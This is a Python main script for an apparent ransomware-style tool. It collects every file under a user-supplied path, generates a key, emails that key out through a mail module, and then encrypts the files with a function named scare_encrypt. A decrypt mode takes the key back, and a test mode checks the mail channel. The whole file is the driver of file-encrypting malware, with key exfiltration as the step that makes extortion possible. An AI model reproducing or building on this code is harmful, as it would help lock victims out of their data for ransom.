from src.pathchecksmodule import *
from src.cryptmodule import *
from src.mailmodule import *
from src.display_messages import *
import sys

def main():
    if len(sys.argv) == 1:
        print(no_args_provided)
        print(help_msg)
        sys.exit(1)
    else:
        encrypt_or_decrypt = sys.argv[1]
    

    if encrypt_or_decrypt == "encrypt":
        input_path = input(r"Enter the Path you want to Encrypt files on: ")
        
        if check_path(input_path):
            all_files_list = find_all_files(input_path)
            
            secret_key, cleaned_key = generate_a_key()
            mail_return = send_key_to_mail(secret_key, cleaned_key)
            if mail_return == 0:
                encrypt_status = scare_encrypt(all_files_list, secret_key)
                if encrypt_status == 0:
                    print("- - - - - - - - - - ENCRYPTION SUCCESSFUL - - - - - - - - - -")
                    print(thanks_msg)
                else:
                    print("- - - - - - - - - - ENCRYPTION FAILED - - - - - - - - - -")
            else:
                exit(1)
            
    elif encrypt_or_decrypt == "decrypt":
        input_path = input(r"Enter the Path you want to Decrypt files on: ")
        if check_path(input_path):
            all_files_list = find_all_files(input_path)
            secret_key_input = input("Enter the Decryption Key: ")
            secret_key_bytes = secret_key_input.encode()
            decrypt_status = scare_decrypt(all_files_list, secret_key_bytes)
            if decrypt_status == 0:
                print("\n\n- - - - - - - - - - FILES DECRYPTED SUCCESSFULLY - - - - - - - - - -")
                print(thanks_msg)
            else:
                print("- - - - - - - - - - DECRYPTION FAILED - - - - - - - - - -")
                exit(1)
    
    elif encrypt_or_decrypt == "testmail":
        mail_return = send_key_to_mail("Your Secret Key will be here.", "Your Cleaned key will be here.")
        if mail_return == 0:
            print("Test Mail Sent Successfully.")
        else:
            print("Failed to send the mail.")
    
    elif encrypt_or_decrypt == "-h" or encrypt_or_decrypt == "--help":
        help_message()
        
    else:
        print(uh_oh)
        print("!!!!! Wrong Arguments Provided !!!!!")
        print(help_msg)
    
    
# Call main function
if __name__ == "__main__": 
        main()